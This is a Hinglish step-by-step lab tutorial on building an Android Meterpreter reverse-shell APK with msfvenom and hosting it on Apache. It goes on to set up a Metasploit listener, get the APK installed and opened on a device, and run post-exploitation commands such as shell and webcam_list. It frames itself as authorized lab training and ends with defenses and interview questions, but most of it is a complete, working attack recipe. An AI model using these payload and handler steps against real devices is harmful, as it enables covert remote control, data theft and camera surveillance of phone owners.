# 🛡️ Practical 3 – Android Reverse Shell (Metasploit + msfvenom)

Aaj hum ek **basic Android penetration testing lab practical** samjhenge jisme:

✔ Android payload generate karna
✔ APK host karna using Apache server
✔ Metasploit handler setup karna
✔ Android Meterpreter session establish karna

⚠️ Ye practical sirf **authorized lab environment (Kali + Android Emulator/Test Device)** ke liye hai.

---

# 1️⃣ Basic Concept 📌

## 📌 Android Reverse Shell Kya Hota Hai?

Android reverse shell me:

👉 Android device attacker machine ko reverse connection bhejta hai.

Matlab:

* Kali Linux listener mode me wait karta hai
* Android device khud connection initiate karta hai

---

## 🧠 Simple Flow

```text id="l1kq8r"
Attacker (Kali)  <------  Android Device / Emulator
      Listener          Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Systems

✔ Kali Linux (Attacker)
✔ Android Emulator / Test Android Device
✔ Same Network

---

# 📌 Recommended Android Emulator

Examples:

✔ Android Studio Emulator
✔ Genymotion
✔ Virtual Android Lab

---

# 3️⃣ Find Kali IP Address 🌐

## 📌 Check IP

```bash id="kp38hb"
ip a
```

Example:

```text id="vscj0m"
192.168.1.10
```

👉 Ye attacker machine ka IP hai
👉 Isko hum **LHOST** bolte hain.

---

# 4️⃣ Generate Android Payload 🧨

## 📌 Purpose

Android APK generate karna jo execute hone par reverse Meterpreter session create kare.

---

## ⚙️ Command

```bash id="jlwm0d"
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
R > malicious.apk
```

---

# 🧠 Command Breakdown

| Parameter                       | Meaning                             |
| ------------------------------- | ----------------------------------- |
| msfvenom                        | Payload generator                   |
| -p                              | Payload type                        |
| android/meterpreter/reverse_tcp | Android Meterpreter reverse payload |
| LHOST                           | Kali attacker IP                    |
| LPORT                           | Listening port                      |
| R                               | Raw APK output                      |
| > malicious.apk                 | Save APK file                       |

---

# 📌 Output

✔ `malicious.apk` generate ho jata hai
✔ Ye Android payload APK hota hai

---

# 5️⃣ Apache Web Server Setup 🌐

## 📌 Purpose

APK ko host karna taaki Android device usko download kar sake.

---

# 📁 Move APK to Web Directory

```bash id="3ujh0t"
sudo mv malicious.apk /var/www/html/
```

---

# 🚀 Start Apache Server

```bash id="7mxt6m"
sudo systemctl start apache2
```

---

# 📌 Check Status

```bash id="ehdt53"
sudo systemctl status apache2
```

---

# 🌍 Access APK

Browser me open karo:

```text id="mbq0hc"
http://192.168.1.10/malicious.apk
```

Agar download start ho jaye → hosting successful.

---

# 6️⃣ Start Metasploit ⚙️

## 📌 Open Framework

```bash id="ql3k86"
msfconsole
```

---

# 7️⃣ Configure Handler 🎯

## 📌 Use Multi Handler

```bash id="2wg1b9"
use exploit/multi/handler
```

---

## 📌 Set Payload

```bash id="yzhqu6"
set payload android/meterpreter/reverse_tcp
```

---

## 📌 Configure Network

```bash id="tv7m7y"
set LHOST 192.168.1.10
```

```bash id="7nrmj6"
set LPORT 4444
```

---

# 8️⃣ Start Listener ▶️

```bash id="b0tpk0"
exploit
```

or

```bash id="81p3a3"
run
```

---

# 📌 Status

✔ Metasploit ab reverse connection ka wait karega.

---

# 9️⃣ Download APK on Android 📲

## 📌 Android Emulator / Device

Browser open karo:

```text id="r3nwrn"
http://192.168.1.10/malicious.apk
```

---

## 📌 Install APK

Android install warning show karega.

Agar lab environment hai to:

✔ “Install unknown apps” enable karo
✔ APK install karo

---

# 🔟 Execute Payload ▶️

## 📌 Open Installed App

APK install hone ke baad:

✔ App open karo

Jaise hi app run hogi:

👉 Reverse connection Metasploit ko bheja jayega.

---

# 1️⃣1️⃣ Session Establishment 🔗

Agar successful hua:

```text id="q5s0lx"
Meterpreter session opened
```

---

# 1️⃣2️⃣ Basic Android Meterpreter Commands 📱

## 📌 Device Info

```bash id="cgrlgm"
sysinfo
```

---

## 📌 Shell Access

```bash id="4pjlwm"
shell
```

---

## 📌 Current App/User

```bash id="9pnf5e"
getuid
```

---

## 📌 File Listing

```bash id="5r04mf"
ls
```

---

## 📌 Webcam / Camera List

```bash id="1lv8y9"
webcam_list
```

---

# 📌 Overall Attack Flow Summary 🔥

```text id="61p4v5"
1. Find Kali IP
2. Generate Android APK payload
3. Move APK to Apache directory
4. Start Apache server
5. Configure Metasploit handler
6. Start listener
7. Download APK on Android
8. Install APK
9. Execute app
10. Meterpreter session established
```

---

# 🛡️ Why Modern Android Blocks This

## 📌 Security Protections

✔ Google Play Protect
✔ APK signature checks
✔ Antivirus apps
✔ Unknown sources restrictions
✔ Runtime permissions

---

# 📌 Why Payloads Often Fail Today

✔ Android version incompatibility
✔ Meterpreter detection
✔ Play Protect removal
✔ SELinux enforcement
✔ Background execution restrictions

---

# 📌 Defense Methods

✔ Don’t install unknown APKs
✔ Keep Play Protect enabled
✔ Use trusted app stores
✔ Review permissions carefully
✔ Keep Android updated

---

# ⚡ Android Emulator vs Real Device

| Emulator              | Real Device         |
| --------------------- | ------------------- |
| Easy testing          | Real-world behavior |
| Safer lab environment | More restrictions   |
| Snapshot restore      | Hardware dependent  |

---

# 🎯 Interview Questions

✔ What is Android Meterpreter?
✔ Why reverse TCP used?
✔ Why APK installation warning appears?
✔ Difference between Android APK and Linux ELF?
✔ Why same payload must match handler?

---

# 🏁 Final Thought

Ye practical Android penetration testing ka foundational concept hai:

👉 APK payload generation
👉 Reverse TCP communication
👉 Meterpreter session handling
👉 Android app execution model

Agar ye clear ho gaya →
Advanced Android exploitation aur mobile security concepts easy ho jate hain 🔥
